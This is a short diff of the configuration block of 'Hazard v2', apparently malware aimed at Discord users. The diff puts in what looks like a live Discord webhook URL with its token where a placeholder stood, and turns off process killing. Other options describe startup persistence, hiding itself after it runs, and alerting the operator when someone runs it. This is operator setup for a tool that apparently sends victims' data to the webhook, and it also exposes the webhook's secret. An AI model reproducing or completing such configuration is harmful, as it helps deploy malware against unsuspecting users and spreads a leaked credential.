@@ -28,7 +28,7 @@ __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/988652876324823060/pHIjWC7OlOJln1Mj7HWo1Xke83dbLqvE4ioNPRWNYjTDb_p2ewzeJ-lvBRi7vWmSx_us",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
@@ -36,7 +36,7 @@ __config__ = {
     # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
+    'kill_processes': False,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
